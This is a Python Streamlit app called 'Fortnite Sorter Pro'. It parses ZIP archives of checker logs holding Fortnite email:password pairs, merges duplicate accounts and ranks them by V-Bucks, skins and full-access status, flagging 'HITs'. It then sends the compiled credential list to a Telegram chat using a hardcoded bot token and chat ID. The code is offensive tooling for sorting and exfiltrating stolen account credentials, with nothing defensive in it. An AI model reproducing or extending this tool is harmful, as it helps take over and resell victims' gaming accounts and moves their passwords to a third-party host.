import os
import re
from collections import defaultdict
import csv
from datetime import datetime
import zipfile
import tempfile
import streamlit as st
import json
import requests
import io
import shutil
import streamlit.components.v1 as components

# --- Configuration ---
SCRIPT_VERSION = "7.1"  # Increment to force cache reset
DEFAULT_TG_TOKEN = "8320526788:AAECI8pPkEqUOEV3JaAz8VEVoLDKfnY2BCY"
DEFAULT_CHAT_ID = "-1003446261251"

# Set page config
st.set_page_config(
    page_title="Fortnite Sorter Pro",
    page_icon="üéÆ",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- Force Cache Reset on Update ---
if 'version' not in st.session_state or st.session_state.version != SCRIPT_VERSION:
    st.session_state.clear()
    st.session_state.version = SCRIPT_VERSION
    st.rerun()

# --- State Management ---
if 'processed_accounts' not in st.session_state:
    st.session_state.processed_accounts = None
if 'stats' not in st.session_state:
    st.session_state.stats = None

# --- Telegram Functions ---
def send_telegram_message(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        return {"ok": False, "description": str(e)}

def send_telegram_document(token, chat_id, file_buffer, filename, caption=""):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    data = {"chat_id": chat_id, "caption": caption}
    file_buffer.seek(0)
    files = {"document": (filename, file_buffer, "text/plain")}
    try:
        response = requests.post(url, data=data, files=files, timeout=30)
        return response.json()
    except Exception as e:
        return {"ok": False, "description": str(e)}

# --- Parser Logic (EXACT COPY FROM UPLOADED OLD SCRIPT) ---
class FortniteAccountParser:
    def __init__(self):
        self.accounts = defaultdict(dict)
        self.stats = {
            "total_accounts": 0, "total_vbucks": 0, "fa_yes": 0, "stw_yes": 0,
            "hit_accounts": 0, "total_skins": 0, "total_matches": 0
        }

    def parse_line(self, line):
        line = line.strip()
        if not line or line.startswith('#') or 'generated by' in line.lower() or '====' in line:
            return None
        
        account = {}
        # 1. Credentials
        email_pass_match = re.match(r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+):([^|\s]+)', line)
        if not email_pass_match:
            return None
            
        account['email'] = email_pass_match.group(1).strip()
        account['password'] = email_pass_match.group(2).strip()
        
        remaining = line[email_pass_match.end():].strip()
        
        def normalize_bool(value):
            if isinstance(value, str):
                lower = value.lower()
                return 'Yes' if lower in ('yes', 'true', '1') else 'No'
            return 'Yes' if value else 'No'

        # --- REGEX PATTERNS FROM OLD SCRIPT ---
        
        # FA
        fa_match = re.search(r'FA:\s*(Yes|No|True|False|1|0)', remaining, re.IGNORECASE)
        account['fa'] = normalize_bool(fa_match.group(1)) if fa_match else 'No'
        
        # 2FA
        twofa_match = re.search(r'2FA:\s*(Yes|No|True|False|1|0)', remaining, re.IGNORECASE)
        account['twofa'] = normalize_bool(twofa_match.group(1)) if twofa_match else 'No'
        
        # STW
        stw_match = re.search(r'STW:\s*(Yes|No|True|False|1|0)', remaining, re.IGNORECASE)
        account['stw'] = normalize_bool(stw_match.group(1)) if stw_match else 'No'
        
        # V-Bucks (Modified slightly to allow commas "1,050" which old script might miss)
        vbucks_match = re.search(r'(Vbucks Count|V-Bucks|Vbucks):\s*([\d,]+)', remaining, re.IGNORECASE)
        account['vbucks'] = int(vbucks_match.group(2).replace(',', '')) if vbucks_match else 0
        
        # Skins Count (Note: No re.IGNORECASE in old script for this)
        skins_count_match = re.search(r'Skins:\s*\[(\d+)\]', remaining)
        account['skins'] = int(skins_count_match.group(1)) if skins_count_match else 0
        
        # Skin Names (Note: No re.IGNORECASE in old script for this)
        # It looks for: Skins: [123]: Skin1, Skin2
        skins_names_match = re.search(r'Skins:\s*\[\d*\]:\s*(.+?)(?=\s*\||$)', remaining)
        account['skin_names'] = [name.strip() for name in skins_names_match.group(1).split(',')] if skins_names_match else []

        # Fallback for Skin Names if strict format fails (Safety Net)
        if not account['skin_names'] and account['skins'] > 0:
             # Try grabbing text after "Skins:" even if brackets are missing
             fallback_match = re.search(r'Skins:\s*(?![\[])(.+?)(?=\s*\||$)', remaining)
             if fallback_match:
                 potential = fallback_match.group(1).split(',')
                 # Basic filter to avoid grabbing numbers
                 account['skin_names'] = [n.strip() for n in potential if not n.strip().isdigit()]

        # Last Played
        last_played_match = re.search(r'Last Played:\s*([^|]+)', remaining)
        account['last_played'] = last_played_match.group(1).strip() if last_played_match else 'Unknown'
        
        # Username
        username_match = re.search(r'Username:\s*([^|]+)', remaining)
        account['username'] = username_match.group(1).strip() if username_match else 'Unknown'
        
        # Matches Played (Old Script Pattern)
        matches_match = re.search(r'Matches Played:\s*(\d+)', remaining, re.IGNORECASE)
        # Fallback if "Played" is missing in newer logs
        if not matches_match:
            matches_match = re.search(r'Matches:\s*(\d+)', remaining, re.IGNORECASE)
        account['matches_played'] = int(matches_match.group(1)) if matches_match else 0
        
        # Points
        points_match = re.search(r'Points\s*=\s*(\d+)', remaining, re.IGNORECASE)
        account['points'] = int(points_match.group(1)) if points_match else 0
        
        # Platform
        platform_match = re.search(r'Platform:\s*([^|]+)', remaining)
        account['platform'] = platform_match.group(1).strip() if platform_match else 'Unknown'
        
        # Level
        level_match = re.search(r'Level:\s*(\d+)', remaining)
        account['level'] = int(level_match.group(1)) if level_match else 0
        
        # Hit Check
        account['is_hit'] = (account['fa'] == 'Yes' and account['stw'] == 'Yes')
        
        return account

    def merge_account(self, existing, new):
        """
        SMART MERGE: Logic from old script.
        Combines data from multiple files for the same email.
        """
        for key, value in new.items():
            # Numeric fields: Keep the higher value
            if key in ('vbucks', 'skins', 'matches_played', 'points', 'level'):
                if value > existing.get(key, 0):
                    existing[key] = value
            
            # Lists (Skins): Keep the longer list
            elif key == 'skin_names':
                if len(value) > len(existing.get(key, [])):
                    existing[key] = value
            
            # Strings: Update if "Unknown" or if new value is present
            elif key in ('last_played', 'username', 'platform'):
                if value != 'Unknown':
                    # If existing is unknown, take new. If both exist, take new (assuming fresher scan).
                    existing[key] = value
            
            # Booleans: If 'Yes' is found, keep it (Upgrade 'No' to 'Yes')
            elif key in ('fa', 'twofa', 'stw'):
                if existing.get(key, 'No') == 'No' and value == 'Yes':
                    existing[key] = value
                    
        # Re-evaluate HIT status after merge
        existing['is_hit'] = (existing.get('fa') == 'Yes' and existing.get('stw') == 'Yes')

    def process_directory(self, root_dir):
        # Recursive walk (Better than old script's flat listdir)
        for root, _, files in os.walk(root_dir):
            for file in files:
                if file.endswith('.txt'):
                    try:
                        # errors='ignore' matches old script behavior to skip bad chars
                        with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                p = self.parse_line(line)
                                if p:
                                    email = p['email']
                                    if email in self.accounts:
                                        # MERGE existing data
                                        self.merge_account(self.accounts[email], p)
                                    else:
                                        self.accounts[email] = p
                    except Exception:
                        pass
        
        # Calculate Final Stats
        vals = self.accounts.values()
        self.stats['total_accounts'] = len(vals)
        self.stats['total_vbucks'] = sum(a.get('vbucks', 0) for a in vals)
        self.stats['hit_accounts'] = sum(1 for a in vals if a.get('is_hit'))
        self.stats['fa_yes'] = sum(1 for a in vals if a.get('fa') == 'Yes')
        self.stats['stw_yes'] = sum(1 for a in vals if a.get('stw') == 'Yes')  # Added STW Count
        self.stats['total_skins'] = sum(a.get('skins', 0) for a in vals)
        
        return len(vals)

    def get_txt_string(self):
        output = io.StringIO()
        # Sort by Vbucks High -> Low
        sorted_accs = sorted(self.accounts.values(), key=lambda x: x.get('vbucks', 0), reverse=True)
        
        output.write(f"Generated by Fortnite Sorter Pro - {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
        output.write("==================================================\n\n")
        
        for acc in sorted_accs:
            skin_sec = f"Skins: [{acc['skins']}]"
            if acc['skin_names']:
                skin_str = ", ".join(acc['skin_names'])
                # Reconstruct format: Skins: [Count]: Name1, Name2
                skin_sec = f"Skins: [{acc['skins']}]: {skin_str}"

            line = (
                f"{acc['email']}:{acc['password']} | "
                f"Vbucks: {acc['vbucks']} | "
                f"FA: {acc['fa']} | "
                f"2FA: {acc['twofa']} | "
                f"STW: {acc['stw']} | "
                f"Level: {acc['level']} | "
                f"Matches Played: {acc['matches_played']} | "
                f"{skin_sec} | "
                f"Last Played: {acc['last_played']}"
            )
            output.write(line + "\n")
            
        return output.getvalue()

# --- UI Render ---
def render_html_view(accounts_json):
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        :root {{ --bg: #0e1117; --card: #1a1c24; --border: #2d2f36; --accent: #FF4B4B; --text: #e0e0e0; --green: #22c55e; --red: #ef4444; --blue: #3b82f6; }}
        body {{ background: transparent; color: var(--text); font-family: 'Inter', sans-serif; margin: 0; font-size: 14px; }}
        
        .controls {{ display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }}
        .btn {{ background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: 0.2s; display: flex; align-items: center; gap: 6px; }}
        .btn:hover, .btn.active {{ border-color: var(--accent); color: var(--accent); background: rgba(255, 75, 75, 0.1); }}
        
        .grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 15px; }}
        .card {{ background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 15px; display: flex; flex-direction: column; gap: 10px; transition: 0.2s; }}
        .card:hover {{ border-color: #555; transform: translateY(-2px); }}
        
        .header {{ display: flex; justify-content: space-between; align-items: center; }}
        .vbucks {{ font-size: 1.2em; font-weight: 700; color: var(--blue); display: flex; align-items: center; gap: 5px; }}
        .email {{ background: #0003; padding: 5px 10px; border-radius: 4px; font-family: monospace; cursor: pointer; border: 1px solid #ffffff05; max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
        .email:active {{ color: var(--accent); border-color: var(--accent); }}
        
        /* Stats Row */
        .stats {{ display: flex; background: #ffffff05; border-radius: 5px; padding: 8px; }}
        .stat {{ flex: 1; text-align: center; border-right: 1px solid #ffffff05; }}
        .stat:last-child {{ border-right: none; }}
        .stat-val {{ font-weight: 700; }}
        .stat-lbl {{ font-size: 0.7em; color: #888; text-transform: uppercase; }}
        
        .yes {{ color: var(--green); }} 
        .no {{ color: var(--red); }}
        
        .skins {{ font-size: 0.85em; color: #aaa; background: #0003; padding: 8px; border-radius: 4px; max-height: 80px; overflow-y: auto; line-height: 1.4; }}
        .skins::-webkit-scrollbar {{ width: 4px; }}
        .skins::-webkit-scrollbar-thumb {{ background: #333; }}
        
        .footer {{ display: flex; justify-content: space-between; font-size: 0.75em; color: #666; }}
    </style>
    </head>
    <body>
        <div class="controls">
            <button class="btn active" onclick="filter('all', this)">All Accounts</button>
            <button class="btn" onclick="filter('hit', this)">üî• HITs</button>
            <button class="btn" onclick="filter('fa', this)">üîì FA</button>
            <button class="btn" onclick="filter('stw', this)">‚ö° STW</button>
            <button class="btn" onclick="filter('1k', this)">üí∞ 1k+ VBucks</button>
            <div style="flex-grow:1; text-align:right; color:#777; align-self:center;" id="count">Loading...</div>
        </div>
        <div class="grid" id="grid"></div>
        <script>
            let data = {accounts_json};
            data.sort((a, b) => b.vbucks - a.vbucks);
            const grid = document.getElementById('grid');
            const count = document.getElementById('count');
            
            function render(items) {{
                grid.innerHTML = '';
                count.innerText = items.length + ' Accounts';
                if(!items.length) {{ grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:30px;color:#555">No accounts found.</div>'; return; }}
                
                items.forEach(acc => {{
                    let skinsTxt = acc.skin_names.length ? acc.skin_names.join(", ") : (acc.skins > 0 ? `Count: ${{(acc.skins)}} (Names missing)` : "None");
                    let card = document.createElement('div');
                    card.className = 'card';
                    card.innerHTML = `
                        <div class="header">
                            <div class="vbucks"><i class="fas fa-coins"></i> ${{acc.vbucks.toLocaleString()}}</div>
                            <div class="email" onclick="navigator.clipboard.writeText('${{acc.email}}:${{acc.password}}')">${{acc.email}}</div>
                        </div>
                        <div class="stats">
                            <div class="stat"><div class="stat-val ${{acc.fa=='Yes'?'yes':'no'}}">${{acc.fa}}</div><div class="stat-lbl">FA</div></div>
                            <div class="stat"><div class="stat-val ${{acc.twofa=='Yes'?'yes':'no'}}">${{acc.twofa}}</div><div class="stat-lbl">2FA</div></div>
                            <div class="stat"><div class="stat-val ${{acc.stw=='Yes'?'yes':'no'}}">${{acc.stw}}</div><div class="stat-lbl">STW</div></div>
                            <div class="stat"><div class="stat-val" style="color:#fff">${{acc.skins}}</div><div class="stat-lbl">Skins</div></div>
                        </div>
                        <div class="skins" title="${{skinsTxt}}"><i class="fas fa-tshirt" style="margin-right:5px;opacity:0.6"></i> ${{skinsTxt}}</div>
                        <div class="footer"><span>Matches: ${{acc.matches_played}}</span><span>${{acc.last_played}}</span></div>
                    `;
                    grid.appendChild(card);
                }});
            }}
            function filter(key, btn) {{
                document.querySelectorAll('.btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active');
                let res = data;
                if(key==='hit') res=data.filter(a=>a.fa==='Yes'&&a.stw==='Yes');
                if(key==='fa') res=data.filter(a=>a.fa==='Yes');
                if(key==='stw') res=data.filter(a=>a.stw==='Yes');
                if(key==='1k') res=data.filter(a=>a.vbucks>=1000);
                render(res);
            }}
            render(data);
        </script>
    </body>
    </html>
    """
    return html

# --- Main App ---
def main():
    with st.sidebar:
        st.header("üì≤ Telegram Bot")
        tg_token = st.text_input("Bot Token", value=DEFAULT_TG_TOKEN, type="password")
        tg_chat_id = st.text_input("Chat ID", value=DEFAULT_CHAT_ID)
        st.markdown("---")
        if st.button("üîÑ Reset App & Data"):
            st.session_state.clear()
            st.rerun()

    st.title("‚ö° Fortnite Sorter Pro v7.1")
    
    if st.session_state.processed_accounts is None:
        uploaded_file = st.file_uploader("üìÇ Upload ZIP file", type="zip")
        if uploaded_file and st.button("üöÄ Process Accounts"):
            with st.spinner("Processing..."):
                temp_dir = tempfile.mkdtemp()
                try:
                    with zipfile.ZipFile(uploaded_file, 'r') as z:
                        z.extractall(temp_dir)
                    
                    parser = FortniteAccountParser()
                    parser.process_directory(temp_dir)
                    
                    st.session_state.processed_accounts = parser.accounts
                    st.session_state.stats = parser.stats
                    shutil.rmtree(temp_dir)
                    st.rerun()
                except Exception as e:
                    st.error(f"Error: {e}")
    else:
        accounts = st.session_state.processed_accounts
        stats = st.session_state.stats
        
        c1, c2, c3 = st.columns([1, 1, 1])
        parser = FortniteAccountParser()
        parser.accounts = accounts
        txt_data = parser.get_txt_string()
        
        with c1:
            st.download_button("üíæ Download Results (TXT)", data=txt_data, file_name=f"Fortnite_Results.txt", mime="text/plain", use_container_width=True)
        with c2:
            if st.button("‚úàÔ∏è Send to Telegram", use_container_width=True):
                with st.spinner("Sending..."):
                    if tg_token and tg_chat_id:
                        msg = f"üìä *Results*\nüë§ Accounts: `{stats['total_accounts']}`\nüî• HITs: `{stats['hit_accounts']}`\nüí∞ V-Bucks: `{stats['total_vbucks']:,}`\nüëï Total Skins: `{stats['total_skins']}`"
                        send_telegram_message(tg_token, tg_chat_id, msg)
                        buf = io.BytesIO(txt_data.encode('utf-8'))
                        send_telegram_document(tg_token, tg_chat_id, buf, "Results.txt")
                        st.success("Sent!")
                    else: st.error("Check keys")
        with c3:
            if st.button("üîô New Upload", use_container_width=True):
                st.session_state.clear()
                st.rerun()

        # UPDATED: 5 Columns for Metrics to include STW
        m1, m2, m3, m4, m5 = st.columns(5)
        m1.metric("Total Accounts", stats['total_accounts'])
        m2.metric("Total V-Bucks", f"{stats['total_vbucks']:,}")
        m3.metric("HITs (FA+STW)", stats['hit_accounts'])
        m4.metric("STW Accounts", stats['stw_yes'])  # New Metric
        m5.metric("Total Skins", stats['total_skins'])
        
        st.divider()
        components.html(render_html_view(json.dumps(list(accounts.values()))), height=1000, scrolling=True)

if __name__ == "__main__":
    main()
